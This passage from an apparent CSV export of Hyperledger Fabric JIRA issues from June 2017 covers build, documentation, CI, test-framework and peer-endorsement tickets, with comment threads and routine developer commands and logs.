      [""init"",""a"",""1000"",""b"",""2000""]
      [u'init', u'a', u'1000', u'b', u'2000']
      Query Exec command: /bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp CORE_PEER_TLS_ROOTCERT_FILE=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781
584e/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt peer chaincode query --name mycc --ctor '{\""Args\"": [\""query\"",\""a\""]}' --channelID behavesystest ""
      {'peer0.org1.example.com': ''}
(snip)
{noformat}
",fabric commit 4e219e9586b241893390f14b6a4d58d500891001,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5ef:",,,,,,,,,,,,,,,,,,,,,,,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 9:39 AM;shimos;CR: https://gerrit.hyperledger.org/r/11035;;;","27/Jun/17 3:33 AM;shimos;Seems to be fixed by https://jira.hyperledger.org/browse/FAB-4961 (https://gerrit.hyperledger.org/r/#/c/11075/);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix default value in ca config,FAB-4944,18585,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,23/Jun/17 11:25 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,23/Jun/17 1:21 PM,,,,v1.0.0,,fabric-build,,,,,,0,,,,,,,The default value of maxenrollments has been update to -1.,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5en:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 11:27 AM;baohua;https://gerrit.hyperledger.org/r/#/c/11045/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release fabric-samples (byfn) to nexus2,FAB-4945,18586,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,jtclark,rameshthoomu,rameshthoomu,23/Jun/17 11:36 AM,31/Jul/18 6:14 AM,28/Oct/23 3:00 AM,31/Jul/18 6:14 AM,v1.0.0-beta,,,v1.0.0,,fabric-build,fabric-ci,,,,,0,build-system,CI_Adhoc_Req,,,,,"Create a CI job to push fabric-samples **(byfn)** to nexus2.. This Job has to trigger manually after perform fabric release. As we don't have Makefile in fabric-samples repository, it's better to curl fabric repo Makefile and publish byfn based on the PROJECT VERSION and IS_RELEASE conditions.",,ChristopherFerris,jtclark,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-10181,,,,,,,,,"1|hzx2a7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,jtclark,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 11:39 AM;rameshthoomu;[~ChristopherFerris] Do we need this job? seems this job is not required to publish **byfn** to nexus as we specified users to do git clone fabric-samples repository.. But it's better to have a byfn reference in nexus2 to avoid git clone. 

Could you please provide your inputs..;;;","11/May/18 1:48 AM;jtclark;[~ChristopherFerris] - Can you give us an update on this JIRA task?;;;","30/Jul/18 11:13 PM;ChristopherFerris;unclear why we would need this, just git clone a commit level. You might want to record the commit level as a submodule of the test repo that runs the test and bump it explicitly.

 ;;;","31/Jul/18 12:18 AM;jtclark;[~ChristopherFerris] Thanks for the update. ;;;","31/Jul/18 6:14 AM;jtclark;This is no longer required.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve UT coverage of orderer/ledger/file,FAB-4946,18587,16261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,23/Jun/17 11:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 1:48 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5ev:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 4:55 PM;guoger;https://gerrit.hyperledger.org/r/#/c/11053/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pre-build Go dependencies in fabric-ccenv to accelerate chaincode compilation,FAB-4947,18588,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,fbenhamo,fbenhamo,23/Jun/17 11:51 AM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,,,,,,fabric-peer,,,,,,1,stale-item,,,,,,"Each time a chaincode is compiled in the Docker container {{fabric-ccenv}}, all its dependencies need to first be built.

This can be seen by running {{go build -v}} in a folder with a chaincode in a container running the {{fabric-ccenv}} image.

This can be solved by installing these dependencies in {{fabric-ccenv}}. Concretely, I think this would just mean adding the following line to the file {{fabric/images/ccenv/Dockerfile.in}}:
{code:java}
RUN go install github.com/hyperledger/fabric/core/chaincode/shim github.com/hyperledger/fabric/protos/peer
{code}
When using a customized {{fabric-ccenv}} image with this optimization (via the environment variable {{CORE_CHAINCODE_BUILDER}}), I get a significant reduction in compilation time for the chaincode (two times faster in my case).",,fbenhamo,sykesm,tzipih0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5f3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,fbenhamo,sykesm,tzipih0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Samples doc says to download 3 binaries but it's actually 4,FAB-4948,18589,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,23/Jun/17 11:59 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 10:52 PM,v1.0.0-rc1,,,v1.0.0,v1.0.0-rc1,fabric-docs,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";23/Jun/17 12:02 PM;mastersingh24;60",,120,60,60,50%,120,60,60,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5fb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 12:02 PM;mastersingh24;https://gerrit.hyperledger.org/r/11047;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode invoke transaction simulation  executed in a non endorser peer,FAB-4950,18591,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,n-horiguchi,daijianw,daijianw,23/Jun/17 12:39 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,31/Oct/17 4:09 PM,v1.0.0-beta,,,,,fabric-peer,,,,,,0,endorser,,,,,,"Environment:  Node SDK v1.0.0-beta , Fabric v1.0.0-beta, balance-transfer example app
Steps to reproduce: 
1.  Edit balance-transfer/artifacts/docker-compose.yaml,  add the following env variable to container peer0.org2.example.com
     CORE_PEER_ENDORSER_ENABLED=false
2.  Run runApp.sh 
3.  Run testAPI.sh
4.  Check container log of peer0.org2.example.com, you can notice the following log message to show the transaction simulation still executed on the peer. 
2017-06-17 02:41:19.357 UTC [endorser] ProcessProposal -> DEBU 34a Entry
2017-06-17 02:41:19.359 UTC [protoutils] ValidateProposalMessage -> DEBU 34b ValidateProposalMessage starts for signed proposal 0xc4214a1230
...
2017-06-17 02:41:19.394 UTC [lockbasedtxmgr] NewTxSimulator -> DEBU 355 constructing new tx simulator
...
2017-06-17 02:41:49.443 UTC [lockbasedtxmgr] GetTxSimulationResults -> DEBU 404 Simulation completed, getting simulation results
2017-06-17 02:41:49.443 UTC [lockbasedtxmgr] Done -> DEBU 405 Done with transaction simulation / query execution [74e5681d-02b1-4fba-8d5f-59273b28e339]
2017-06-17 02:41:49.443 UTC [endorser] simulateProposal -> DEBU 406 Exit



5. Check running container by ""docker ps"", you will notice the following  chaincode container is running:
  dev-peer0.org2.example.com-mycc-v0

",,daijianw,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5fr:",,,,,,,,,,,,,,,,,,,,,,,daijianw,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Oct/17 4:07 PM;n-horiguchi;It seems that the environment variable CORE_PEER_ENDORSER_ENABLED was not available at v1.0.0-beta timeframe, and removed at commit: 5eeba446 (-FAB-4597-). So this issue is no longer a issue, I think.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add description for PATH setting,FAB-4951,18593,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,tsrb,tsrb,tsrb,23/Jun/17 2:34 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"Add description for PATH setting.
To run configtxgen and cryptogen, ""/path/to/hyperledger/fabric/build/bin"" must be set in PATH.
",,joe-alewine,nnao,tsrb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5g7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,joe-alewine,nnao,tsrb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/17 2:06 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11073/;;;","23/Mar/18 5:57 AM;joe-alewine;CR was abandoned.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix GetPublicVersion in msp,FAB-4953,18595,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,baohua,baohua,baohua,23/Jun/17 4:47 PM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,v1.0.0,,fabric-crypto,,,,,,0,,,,,,,"The GetPublicVersion method in msp/msp.go actually returns the public part of the identity.

Need to fix its name to GetPublicPart",,angelo.decaro,baohua,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5gn:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,baohua,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 4:54 PM;baohua;https://gerrit.hyperledger.org/r/#/c/11051/;;;","16/Jul/17 6:25 PM;mastersingh24;[~adc] - can you take a look at this?;;;","17/Jul/17 9:29 AM;angelo.decaro;[~baohua][~mastersingh24], Isn't is too late now to change the API? Anyway, following golang standard naming we should call it just *Public*, no?

[~binhn][~ChristopherFerris], Which are the rules for changing the API? How do we deprecate methods?;;;","17/Jul/17 10:48 AM;baohua;[~angelo.decaro] i guess the API freezing is due to the 1.0 release.

now the 1.0 version is out, we can continue on the improvement?

And about the name, as it's only return part of the content, would suggest include the PublicPart in the name. How do u think?

Thanks!;;;","18/Jul/17 4:47 AM;ChristopherFerris;[~angelo.decaro] you deprecate a method by having its comment begin with ""Deprecated"" e.g. [https://golang.org/src/syscall/bpf_bsd.go?h=Deprecated#L20]

As for what are the rules... it isn't clear that we have a deprecation case here as much as a mis-named method. Why not just fix the name? ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a developer, I'd like to build Fabric on Windows",FAB-4955,18602,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,lehors,lehors,lehors,23/Jun/17 8:03 PM,14/Jan/20 10:02 PM,28/Oct/23 3:00 AM,14/Jan/20 10:02 PM,v1.0.0-beta,,,Future,,fabric-build,,,,,,0,windows,,,,,,"Environment:

Windows 7 Pro

Docker Toolbox 15.05.0-ce

Go 1.7.4

Git 2.9.0
{code:java}
$ make docker
Building build/docker/bin/peer
C:\Program Files\Docker Toolbox\docker.exe: Error response from daemon: invalid bind mount spec ""C:/Users/lehors/Documents/Projects/Go/src/github.com/hyperledger/fabric/build/docker/peer/pkg:/opt/gopath/pkg"": invalid mode: /opt/gopath/pkg.
See 'C:\Program Files\Docker Toolbox\docker.exe run --help'.
make: *** [makefile:197: build/docker/bin/peer] Error 125{code}
The problem stems from the fact that the docker command can't handle Windows absolute paths starting with a drive letter and the make's abspath function used in our Makefile does just that: expand paths into absolute paths that include the drive letter.

 

 

 

 

 ",,ChristopherFerris,denyeart,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5h3:",,,,Unset,,,,,,,4.0,Unset,,,,,,,,,,,ChristopherFerris,denyeart,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 8:33 PM;lehors;Beside the abspath and docker issue, GNU make 4.2 on Windows 7, isn't able to deal with a large list of filenames to be passed to the shell command, so trying to make build/goshim.tar.bz2 fails with the following error:
{code:java}
Creating build/goshim.tar.bz2
process_begin: CreateProcess(NULL, C:/Program Files/Git/usr/bin/sh.exe -c ""tar -jhc -C C:\Users\lehors\Documents\Projects\Go/src github.com/hyperledger/fabric/bccsp/aesopts.go github.com/hyperledger/fabric/bccsp/bccsp.go github.com/hyperledger/fabric/bccsp/bccsp_test.go github.com/hyperledger/fabric/bccsp/ecdsaopts.go 
...
endor/gopkg.in/yaml.v2/sorter.go github.com/hyperledger/fabric/vendor/gopkg.in/yaml.v2/writerc.go github.com/hyperledger/fabric/vendor/gopkg.in/yaml.v2/yaml.go github.com/hyperledger/fabric/vendor/gopkg.in/yaml.v2/yamlh.go github.com/hyperledger/fabric/vendor/gopkg.in/yaml.v2/yamlprivateh.go > build/goshim.tar.bz2"", ...) failed.
make (e=87): The parameter is incorrect.
make: *** [makefile:287: build/goshim.tar.bz2] Error 87{code}
 ;;;","27/Nov/17 12:30 PM;denyeart;[~lehors] Are you still intending to work on this one?;;;","27/Nov/17 9:59 PM;lehors;As a matter of fact, I just started working again on it this weekend. Testing with the latest MSYS2 and Cygwin environments to see if I can get something working.

So far, it seems that the situation has improved - especially the latest make command seems to work better - but there still are issues making this to work a challenge.;;;","04/Jan/18 10:10 PM;ChristopherFerris;[~lehors] update? ;;;","09/Mar/18 12:23 AM;lehors;The latest version of make I could find on Windows makes the build a bit less painful but I'm definitely not yet close to getting this to work.

If anyone has a desire to take this on, feel free to reassign it to yourself. Otherwise I will keep trying it every now and then as time permits.;;;","21/Aug/18 8:04 PM;denyeart;As this is low priority, I'll mark as 'Future'.;;;","19/Apr/19 8:46 PM;mastersingh24;We really do not claim support at all for building on Windows ... although it should work on Windows 10 with the Ubuntu env they provide.

In master / 2.0 and later, you can at least more easily build Docker images simply running `docker build ...`;;;","13/Jan/20 7:27 PM;lehors;I'm happy to report that the combination of the simplification of our Makefile and the improvement in the tools available on Windows means that I was able to build Fabric on Windows 7.

I have had success using the following MSYS2 distribution with a twist on how to launch docker toolbox so that it uses that environment rather than the default git one.

[https://github.com/msys2/msys2/wiki/MSYS2-installation]

I will submit an update to the doc to document it and we can close this long standing ticket!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable debug-on-error in case of behave test failures,FAB-4956,18603,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nemoto,nemoto,nemoto,23/Jun/17 8:04 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,06/Jul/18 10:55 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Launch debugger like ipdb to easily investigate the reason when a step fails in behave tests by using the after_step() hook. Example usage is as follows.

 
{code:java}
$ behave peer.feature -D BEHAVE_DEBUG_ON_ERROR -n FAB-3866 --no-capture
Successfully imported protobufs from bddtests directory
Feature: Peer Service # peer.feature:16
As a user I want to be able have channels and chaincodes to execute
@daily
Scenario Outline: FAB-3866: Multiple Chaincodes Per Peer -- @1.1
(...snip)
> /home/xxx/go/src/github.com/hyperledger/fabric/test/feature/steps/endorser_impl.py(148)step_impl()
147 print(result)
--> 148 assert result[peers[0]] == ""Query Result: {0}\n"".format(value), ""Expect {0} = {1}, received from the deploy: {2}"".format(key, value, result[peers[0]])
149 

ipdb> print(context.chaincode)
{'args': u'[""init"", ""a"", ""500"" , ""b"", ""1000""]', 'orderers': ['orderer0.example.com'], 'name': u'example02val', 'language': 'GOLANG', 'path': u'github.com/hyperledger/fabric/examples/chaincode/go/invokereturnsvalue', 'channelID': 'behavesystest'}
ipdb> q
(...continuing)
{code}",,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5hb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
publish sacc source in fabric-samples,FAB-4957,18606,14853,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,23/Jun/17 9:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 9:49 PM,v1.0.0-beta,,,DUPLICATE,,fabric-samples,,,,,,0,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5hr:",,,,,,Sprint 12 - Documentation,Sprint 13 - Documentation,Sprint 14 - Documentation,Sprint 15 - Documenation,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect Directory In Building The Docs Locally,FAB-4959,18608,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,bmos299,bmos299,bmos299,23/Jun/17 10:52 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Sep/17 9:22 PM,,,,v1.1.0,,fabric-docs,,,,,,0,Documentation,,,,,,"In the README.md at https://github.com/hyperledger/fabric/tree/master/docs#building-the-docs-on-your-machine needs a directory change. 

The ability to build the docs locally using sphinx is very valuable to preview ones work.  The directions at https://github.com/hyperledger/fabric/tree/master/docs#building-the-docs-on-your-machine specify the builds go into:
cd source/build/html

....the correct directory based on the Makefile and the results is:
cd build/html
",,bmos299,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5i7:",,,,,,,,,,,,,,,,,,,,,,,bmos299,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CLI container not starting outside vagrant,FAB-4961,18612,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,24/Jun/17 12:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jun/17 7:36 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"When trying to execute the system behave tests outside of the vagrant environment, the following error is received:

{code}
 Creating cli
      
      ERROR: for cli  Cannot start service cli: oci runtime error: container_linux.go:247: starting container process caused ""chdir to cwd (\""/opt/gopath/src/github.com/hyperledger/fabric/peer\"") set in config.json failed: no such file or directory""
      Encountered errors while bringing up the project
{code}

This error is seen in CI as well.",,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5in:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jun/17 5:56 AM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11075/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
End to end example scripting should allow CouchDB username and password,FAB-4962,18613,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,chris.elder,chris.elder,chris.elder,24/Jun/17 1:20 AM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,,,,,,fabric-ledger,,,,,,0,stale-item,,,,,,"The example for the end to end Getting Started scenario should allow CouchDB and the peer to be configured with CouchDB username and password.

The proposed change to docker-compose-couch.yaml would allow admin usernames and passwords to be added for couchdb and peer docker images.  

All parameters added to the script are left uninitialized.  This allows the script to run ""as is"" and the CouchDB containers are created in ""admin party"" mode.  If the new variables are populated, the CouchDB containers and peers are created with usernames and passwords.",,chris.elder,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx2en:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,chris.elder,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Build Your First Network manual instructions broken due to new tls certs,FAB-4963,18614,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,24/Jun/17 1:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jun/17 1:52 AM,,,,,,fabric-docs,,,,,,0,,,,,,,"Orderer now uses separate tls ca certs.

Updating byfn manual instructions to utilize

the new orderer tls ca certs.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2cv:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update bootstrap script with proper artifact id ,FAB-4967,18619,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,24/Jun/17 2:52 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,24/Jun/17 4:06 AM,,,,,,,,,,,,0,,,,,,,update bootstrap script with proper artifact id from nexus,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FAB-4518,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx25r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix formatting and TODO in Build Your First Network doc,FAB-4968,18621,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,24/Jun/17 3:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jun/17 9:52 PM,,,,,,fabric-docs,,,,,,0,,,,,,,"Fixed formatting issue.

Fixed TODO.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2d3:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
behave test fmwk: fails when querying for error message from query result,FAB-4969,18623,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,Nishi,Nishi,24/Jun/17 4:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 12:03 AM,v1.0.0-beta,,,v1.0.0,,fabric-quality,,,,,,0,quality,,,,,,"When running attached feature file steps :
{code:java}
When a user invokes on the chaincode named ""mycc"" with args [""delete"",""marble201""]
And I wait ""20"" seconds
When a user queries on the chaincode named ""mycc"" with args [""readMarble"",""marble201""]
#  Then a user receives expected response of {""Marble does not exist: marble201""}{code}
 

Then statement could not verified since message is thrown as an error from chaincode API.

